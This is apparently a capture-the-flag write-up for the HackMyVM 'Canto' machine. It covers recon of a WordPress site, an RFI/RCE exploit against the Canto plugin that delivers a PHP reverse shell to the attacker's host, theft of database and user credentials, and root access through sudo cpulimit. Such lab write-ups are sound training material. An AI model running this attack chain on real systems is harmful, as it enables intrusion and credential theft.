# Canto

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.89:22
Open 10.0.2.89:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.89
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKkMLZHCokv5rpKTUUfitgdTSiyieZXC1kqsQS8DEnLgk6x5fOmlzHim2qgiwoJhyEJa7Nj1k3K6pwm5RVxEjEU=
|   256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDR8+o8qabpIHzS2zgBZDxfX0Tm5eWBBstEt5QeYN04+
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Ubuntu))
|_http-generator: WordPress 6.5.3
|_http-title: Canto
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.57 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/canto/writeup.png)

```bash
â””â”€$ nuclei -u http://10.0.2.89/ -tags wordpress
[wordpress-akismet:outdated_version] [http] [info] http://10.0.2.89/wp-content/plugins/akismet/readme.txt ["5.3.2"] [last_version="5.5"]
[wordpress-directory-listing] [http] [info] http://10.0.2.89/wp-content/uploads/
[wordpress-directory-listing] [http] [info] http://10.0.2.89/wp-includes/
[wp-license-file] [http] [info] http://10.0.2.89/license.txt
[wordpress-login] [http] [info] http://10.0.2.89/wp-login.php
[wordpress-readme-file] [http] [info] http://10.0.2.89/readme.html
[wordpress-xmlrpc-detect] [http] [info] http://10.0.2.89/xmlrpc.php
[wp-user-enum:usernames] [http] [low] http://10.0.2.89/?rest_route=/wp/v2/users/ ["erik"]
[wordpress-detect:version_by_css] [http] [info] http://10.0.2.89/wp-admin/install.php ["6.8.3"]
[wordpress-theme-detect:twentytwentyfour] [http] [info] http://10.0.2.89/
```

### RFI

```bash
â””â”€$ curl http://10.0.2.89/wp-content/plugins/canto/readme.txt
=== Canto ===
Contributors: Canto Inc, ianthekid, flightjim
Tags: digital asset management, brand management, cloud storage, DAM, file storage, image management, photo library, Canto
Requires at least: 5.0
Tested up to: 6.1
Stable tag: 3.0.4
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html

Easily find and publish your creative assets directly to wordpress without having to search through emails or folders, using digital asset management by Canto.

== Description ==

Simplify collaboration with your creative team by publishing photos, images, and other web-safe media from Canto directly to your WordPress website.
Instead of sending files back and forth, browse or search your Canto library directly in WordPress. You can search for text within file names, descriptions, comments, keywords, tags, or even the name of the person who uploaded the file to Canto.
Once you click to insert the image, it will save automatically to your WordPress Media Library.
Donâ€™t have a Canto account? <a href="https://www.canto.com/signup/?utm_source=wordpress&utm_medium=plugin&utm_campaign=wordpress">Start a free trial</a> today!
```

```bash
â””â”€$ searchsploit Canto
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)    | windows/dos/45095.py
Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)            | multiple/webapps/49189.txt
Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remot | php/webapps/51826.py
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

â””â”€$ searchsploit php/webapps/51826.py -m
  Exploit: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51826
     Path: /usr/share/exploitdb/exploits/php/webapps/51826.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (344)
Copied to: /home/woyag/Desktop/Rooms/HackMyVM/Atom/Canto/51826.py
```

### Reverse Shell

```bash
â””â”€$ sed 's/127.0.0.1/10.0.2.15/; s/1234/4444/' /usr/share/webshells/php/php-reverse-shell.php > rev.php
â””â”€$ py 51826.py -u http://10.0.2.89/ -LHOST 10.0.2.15 -s rev.php
---
â””â”€$ pwncat-cs -lp 4444
[14:04:53] Welcome to pwncat ðŸˆ!                                         
[14:07:58] received connection from 10.0.2.89:55782                     
[14:07:59] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash  
           10.0.2.89:55782: registered new host w/ db                   
(local) pwncat$
(remote) www-data@canto:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
(remote) www-data@canto:/var/www/html$ cat wp-config.php | grep define
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', '2NCVjoWVE9iwxPz' );
define( 'DB_HOST', 'localhost' );
...

(remote) www-data@canto:/var/www/html$ mysql -u'wordpress' -p'2NCVjoWVE9iwxPz' wordpress -e 'SELECT CONCAT(user_login,":",user_pass) FROM wp_users' -Ns
erik:$P$BZk2jE4XrC91HKgRS83h0gICjM0bcB.
```

John was not able to crack it.

### Backup

```bash
(remote) www-data@canto:/var/www/html$ find /home -type f -ls 2>/dev/null
   262172      4 -rw-rw-r--   1 erik     erik           68 May 12  2024 /home/erik/notes/Day1.txt
   262173      4 -rw-rw-r--   1 erik     erik           71 May 12  2024 /home/erik/notes/Day2.txt
   265482      4 -rw-r--r--   1 erik     erik          220 Jan  7  2023 /home/erik/.bash_logout
   265483      4 -rw-r--r--   1 erik     erik          807 Jan  7  2023 /home/erik/.profile
   262177      4 -rw-r-----   1 root     erik           33 May 12  2024 /home/erik/user.txt
   265484      4 -rw-r--r--   1 erik     erik         3771 Jan  7  2023 /home/erik/.bashrc
```

```bash
(remote) www-data@canto:/var/www/html$ cat /home/erik/notes/Day1.txt
On the first day I have updated some plugins and the website theme.
(remote) www-data@canto:/var/www/html$ cat /home/erik/notes/Day2.txt
I almost lost the database with my user so I created a backups folder.
```

```bash
(remote) www-data@canto:/var/www/html$ find / -name backups -ls 2>/dev/null
    10540      0 drwxr-xr-x   2 root     root            3 Apr 22  2024 /snap/core24/1225/var/backups
    14364      0 drwxr-xr-x   2 root     root            3 Apr 18  2022 /snap/core22/1380/var/backups
    14239      0 drwxr-xr-x   2 root     root            3 Apr 18  2022 /snap/core22/864/var/backups
   132604      4 drwxr-xr-x   2 root     root         4096 Oct 29 17:47 /var/backups
   132877      4 drwxr-xr-x   2 root     root         4096 May 12  2024 /var/wordpress/backups

(remote) www-data@canto:/var/wordpress/backups$ cat 12052024.txt
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
```

## SSH

```bash
â””â”€$ sshpass -p 'th1sIsTheP3ssw0rd!' ssh erik@10.0.2.89
erik@canto:~$ id
uid=1001(erik) gid=1001(erik) groups=1001(erik)
```

### User.txt

```bash
erik@canto:~$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

## Privilege Escalation

```
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
```

[https://gtfobins.github.io/gtfobins/cpulimit](https://gtfobins.github.io/gtfobins/cpulimit)

```bash
erik@canto:~$ sudo cpulimit -l 100 -f /bin/bash
Process 2091 detected
root@canto:/home/erik# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@canto:/home/erik# cat /root/root.txt
1b56eefaab2c896e57c874a635b24b49
```